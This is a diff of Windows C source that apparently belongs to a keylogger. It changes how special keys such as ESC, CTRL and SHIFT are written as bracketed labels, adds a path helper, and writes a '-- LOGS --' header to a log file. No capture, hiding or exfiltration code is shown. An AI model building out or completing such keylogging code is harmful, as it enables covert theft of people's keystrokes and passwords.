@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <stdio.h>
 #include <tlhelp32.h>
 
 char* handleSpecialCase(DWORD vkCode)
@@ -6,29 +7,42 @@ char* handleSpecialCase(DWORD vkCode)
     switch (vkCode)
     {
         case VK_ESCAPE:
-            return "ESC";
+            return "[ESC]";
         case VK_RETURN:
-            return "RETURN";
+            return "[RETURN]";
         case VK_TAB:
-            return "TAB";
+            return "[TAB]";
         case VK_CONTROL:
         case VK_LCONTROL:
         case VK_RCONTROL:
-            return "CTRL";
+            return "[CTRL]";
         case VK_MENU:
         case VK_LMENU:
         case VK_RMENU:
-            return "ALT";
+            return "[ALT]";
         case VK_SHIFT:
         case VK_LSHIFT:
         case VK_RSHIFT:
-            return "SHIFT";
+            return "[SHIFT]";
         case VK_CAPITAL:
-            return "CAPS_LOCK";
+            return "[CAPS_LOCK]";
         case VK_BACK:
-            return "BACK";
+            return "[BACK]";
     }
     return NULL;
+}
+
+int getFolderStringLength (TCHAR* str)
+{
+    int lastBackslashPos = 0;
+    for (int i = 0; i < strlen(str); i++)
+    {
+        if (str[i] == '\\')
+        {
+            lastBackslashPos = i;
+        }
+    }
+    return lastBackslashPos;
 }
 
 HANDLE openOrCreateFile(char* filename)
@@ -42,7 +56,6 @@ HANDLE openOrCreateFile(char* filename)
                        CREATE_NEW,        
                        FILE_ATTRIBUTE_NORMAL,
                        NULL);
-
     // If creation failed try to edit it
     if (hFile == INVALID_HANDLE_VALUE) 
     { 
@@ -55,8 +68,19 @@ HANDLE openOrCreateFile(char* filename)
                            NULL);
         if (hFile == INVALID_HANDLE_VALUE)
         {
-            printf("Terminal failure: Unable to creat or open file.\n");
+            printf("[Terminal failure: Unable to creat or open file.\n]");
         }
+    }
+    else
+    {
+        char header[] = "-- LOGS --";
+        DWORD dwBytesWritten;
+        WriteFile( 
+            hFile,
+            header,
+            strlen(header),
+            &dwBytesWritten,
+            NULL);
     }
     return hFile;
 }
